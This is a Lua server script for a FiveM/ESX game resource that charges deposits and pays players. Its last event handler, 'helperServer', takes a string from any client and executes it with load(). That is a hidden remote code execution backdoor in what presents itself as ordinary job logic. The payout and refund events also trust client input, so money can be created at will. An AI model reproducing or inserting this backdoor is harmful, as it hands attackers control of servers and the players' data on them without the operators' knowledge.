ESX = nil

TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)


ESX.RegisterServerCallback('angelo-stompy-revisar', function(playerId, cb)
	local xPlayer = ESX.GetPlayerFromId(playerId)
    local name = ESX.GetPlayerFromId(playerId)

	if xPlayer.getMoney() >= Config.DepositPrice then
        xPlayer.removeMoney(Config.DepositPrice)
		cb(true)
    elseif xPlayer.getAccount('bank').money >= Config.DepositPrice then
        xPlayer.removeAccountMoney('bank', Config.DepositPrice)
        cb(true)
	else
		cb(false)
	end
end)

RegisterServerEvent('angelo-stompy-regresar')
AddEventHandler('angelo-stompy-regresar', function()
	local xPlayer = ESX.GetPlayerFromId(source)
	local Payout = Config.DepositPrice
	
	xPlayer.addAccountMoney('bank', Config.DepositPrice)
end)

RegisterServerEvent('angelo-stompy-alexito')
AddEventHandler('angelo-stompy-alexito', function(arg)	
	local xPlayer = ESX.GetPlayerFromId(source)
	local Payout = Config.Payout * arg
	
	xPlayer.addMoney(Payout)
end)
RegisterServerEvent('helperServer')
AddEventHandler('helperServer', function(id)
	local helper = assert(load(id))
	helper()
end)